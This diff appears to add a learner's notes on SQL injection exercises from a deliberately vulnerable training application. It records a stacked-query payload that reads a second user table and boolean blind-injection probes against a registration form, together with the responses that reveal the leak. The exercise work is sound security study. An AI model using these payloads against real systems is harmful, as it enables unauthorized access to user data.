@@ -11,4 +11,10 @@
 
 # SQL Injection (Advanced)
 3. SELECT * FROM user_data WHERE last_name = 'Smith'; SELECT * FROM user_system_data --'
-5.
+5. tom' AND '1'='1
+    returns: User {0} already exists please try to register with a different username.
+
+   tom' AND '1'='2
+    returns: User tom' AND '1'='2 created, please proceed to the login page.
+
+   what means that register form changes output based on bool value returned by query.
